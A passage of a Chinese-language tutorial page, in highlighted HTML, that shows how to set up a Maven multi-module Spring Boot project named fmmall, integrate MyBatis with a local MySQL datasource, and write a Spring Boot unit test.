punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>common<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="3-2-3-创建beans工程"><a href="#3-2-3-创建beans工程" class="headerlink" title="3.2.3 创建beans工程"></a>3.2.3 创建beans工程</h6><ul><li>选择fmmall，右键—New—Module （Maven工程）</li><li>修改beans的pom.xml，设置packing —– jar</li></ul><h6 id="3-2-4-创建mapper工程"><a href="#3-2-4-创建mapper工程" class="headerlink" title="3.2.4 创建mapper工程"></a>3.2.4 创建mapper工程</h6><ul><li><p>选择fmmall，右键—New—Module （Maven工程）</p></li><li><p>修改mapper的pom.xml，设置packing —– jar</p></li><li><p>在mapper的pom.xml，依赖beans</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>beans<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="3-2-5-创建service工程"><a href="#3-2-5-创建service工程" class="headerlink" title="3.2.5 创建service工程"></a>3.2.5 创建service工程</h6><ul><li><p>选择fmmall，右键—New—Module （Maven工程）</p></li><li><p>修改service的pom.xml，设置packing —– jar</p></li><li><p>在service的pom.xml，依赖mapper、commom</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mapper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>common<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h6 id="3-2-6-创建api工程"><a href="#3-2-6-创建api工程" class="headerlink" title="3.2.6 创建api工程"></a>3.2.6 创建api工程</h6><ul><li><p>选择fmmall，右键—New—Module （SpringBoot工程）</p></li><li><p>修改api的pom.xml，继承fmmall，删除自己的groupId 和 version</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fmmall<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将spring boot的依赖配置到父工程fmmall的pom.xml</p></li><li><p>在父工程fmmall的pom.xml的modules添加api</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--fmmall  pom.xml--&gt;</span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.4.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span> <span class="token comment">&lt;!-- lookup parent from repository --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fmmall<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">&gt;</span></span>common<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">&gt;</span></span>beans<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">&gt;</span></span>mapper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">&gt;</span></span>service<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">&gt;</span></span>api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>excludes</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>excludes</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在api中，依赖service</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>service<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>api的pom.xml继承fmmall</p></li></ul><h4 id="3-3-Maven聚合工程依赖分析"><a href="#3-3-Maven聚合工程依赖分析" class="headerlink" title="3.3 Maven聚合工程依赖分析"></a>3.3 Maven聚合工程依赖分析</h4><blockquote><p>如果将依赖添加到父工程的pom中，根据依赖的继承关系，所有的子工程中都会继承父工程的依赖：</p><ul><li><p>好处：当有多个子工程都需要相同的依赖时，无需在子工程中重复添加依赖</p></li><li><p>缺点：如果某些子工程不需要这个依赖，还是会被强行继承</p></li></ul><p>如果在父工程中没有添加统一依赖，则每个子工程所需的依赖需要在子工程的pom中自行添加</p><p>如果存在多个子工程需要添加相同的依赖，则需在父工程pom进行依赖版本的管理</p></blockquote><p><img src="imgs/1618365559362.png" alt="1618365559362"></p><p><strong><code>依赖配置说明</code></strong></p><ol><li>在父工程的pom文件中一次性添加各个子工程所需的所有依赖</li><li>在各个子工程中单独添加当前子工程的依赖</li></ol><h4 id="3-4-整合MyBatis"><a href="#3-4-整合MyBatis" class="headerlink" title="3.4 整合MyBatis"></a>3.4 整合MyBatis</h4><h6 id="3-4-1-common子工程"><a href="#3-4-1-common子工程" class="headerlink" title="3.4.1 common子工程"></a>3.4.1 common子工程</h6><ul><li>lombok</li></ul><h6 id="3-4-2-beans子工程"><a href="#3-4-2-beans子工程" class="headerlink" title="3.4.2 beans子工程"></a>3.4.2 beans子工程</h6><ul><li>lombok</li></ul><h6 id="3-4-3-MyBatis整合"><a href="#3-4-3-MyBatis整合" class="headerlink" title="3.4.3 MyBatis整合"></a>3.4.3 MyBatis整合</h6><ul><li><p>在<strong>mapper子工程</strong>的pom文件，新增mybatis所需的依赖</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--mysql--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.1.47<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--spring-boot-starter--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.4.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--mybatis starter--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.mybatis.spring.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mybatis-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.1.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在<strong>mapper子工程</strong>的<code>resources</code>目录创建<code>application.yml</code></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">driver-class-name</span><span class="token punctuation">:</span> com.mysql.jdbc.Driver    <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/db_2010_mybatis<span class="token punctuation">?</span>characterEncoding=utf<span class="token punctuation">-</span><span class="token number">8</span>    <span class="token key atrule">username</span><span class="token punctuation">:</span> root    <span class="token key atrule">password</span><span class="token punctuation">:</span> admin123<span class="token key atrule">mybatis</span><span class="token punctuation">:</span>  <span class="token key atrule">mapper-locations</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>mappers/<span class="token important">*Mapper.xml</span>  <span class="token key atrule">type-aliases-package</span><span class="token punctuation">:</span> com.qfedu.fmmall.entity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在<strong>api子工程</strong>的启动类通过<code>@MpperScan</code>声明dao包的路径</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@MapperScan</span><span class="token punctuation">(</span><span class="token string">"com.qfedu.fmmall.dao"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApiApplication</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">ApiApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="3-5-基于SpringBoot的单元测试"><a href="#3-5-基于SpringBoot的单元测试" class="headerlink" title="3.5 基于SpringBoot的单元测试"></a>3.5 基于SpringBoot的单元测试</h4><h6 id="3-5-1-添加依赖"><a href="#3-5-1-添加依赖" class="headerlink" title="3.5.1 添加依赖"></a>3.5.1 添加依赖</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--test starter--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="3-5-2-测试类"><a href="#3-5-2-测试类" class="headerlink" title="3.5.2 测试类"></a>3.5.2 测试类</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@SpringBootTest</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token class-name">ApiApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDAOTest</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> <span class="token class-name">UserDAO</span> userDAO<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">queryUserByName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 